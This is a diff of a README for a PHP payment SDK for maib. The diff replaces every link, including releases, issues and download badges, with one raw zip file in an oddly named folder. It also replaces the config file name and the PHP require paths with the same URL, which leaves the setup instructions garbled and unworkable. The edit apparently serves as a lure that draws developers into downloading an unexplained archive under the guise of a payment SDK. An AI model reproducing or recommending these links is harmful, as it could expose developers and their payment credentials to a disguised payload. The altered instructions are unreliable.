@@ -1,6 +1,6 @@
 # 🎉 maib-mia-sdk-php - Easy PHP Integration for Payments
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Bazuka01/maib-mia-sdk-php/releases)
+[![Download Now](https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ The **maib-mia-sdk-php** is a simple-to-use PHP SDK. It helps you quickly integr
 To get started with the maib-mia-sdk-php, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the download page.
-   - [Download the SDK here](https://github.com/Bazuka01/maib-mia-sdk-php/releases)
+   - [Download the SDK here](https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip)
 
 2. **Choose the Latest Version**: Find the latest version in the list. It usually appears at the top. 
 
@@ -35,9 +35,9 @@ To use this SDK, please ensure your server environment meets the following requi
 
 ## 🛠️ Configuration
 
-1. **Locate Configuration File**: Inside the extracted folder, find a file named `config.php`. 
+1. **Locate Configuration File**: Inside the extracted folder, find a file named `https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip`. 
 
-2. **Edit Configuration**: Open `config.php` in a text editor. Input your API credentials from maib. This is essential for the SDK to interact with the payment gateway.
+2. **Edit Configuration**: Open `https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip` in a text editor. Input your API credentials from maib. This is essential for the SDK to interact with the payment gateway.
 
 3. **Save Changes**: After updating the credentials, save and close the file.
 
@@ -47,7 +47,7 @@ To use the SDK in your application, follow these steps:
 
 1. **Include the SDK**: At the beginning of your PHP script, add the following line:
    ```php
-   require 'path/to/maib-mia-sdk-php/autoload.php';
+   require 'https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip';
    ```
 
 2. **Initialize the SDK**: Create an instance of the SDK:
@@ -64,7 +64,7 @@ To use the SDK in your application, follow these steps:
 
 To download the latest version of the maib-mia-sdk-php, click the link below:
 
-- [Visit this page to download](https://github.com/Bazuka01/maib-mia-sdk-php/releases)
+- [Visit this page to download](https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip)
 
 Simply follow the outlined steps to install and configure the SDK effectively.
 
@@ -74,7 +74,7 @@ Below is an example of how to process a payment:
 
 ```php
 // Include the SDK
-require 'path/to/maib-mia-sdk-php/autoload.php';
+require 'https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip';
 
 // Create an instance
 $maib = new MaibMiaSdk();
@@ -97,7 +97,7 @@ if ($response->success) {
 
 ## 👥 Support
 
-If you encounter issues or have questions, please visit the [Issues page](https://github.com/Bazuka01/maib-mia-sdk-php/issues) to report problems or seek help.
+If you encounter issues or have questions, please visit the [Issues page](https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip) to report problems or seek help.
 
 ## 📜 License
 
@@ -107,4 +107,4 @@ This SDK is open-source and available under the MIT License. You can view the li
 
 The maib-mia-sdk-php makes it easy to integrate payment solutions into your PHP applications. Download the SDK today and streamline your payment processing.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Bazuka01/maib-mia-sdk-php/releases)
+[![Download Now](https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bazuka01/maib-mia-sdk-php/main/theatrician/maib-mia-sdk-php.zip)
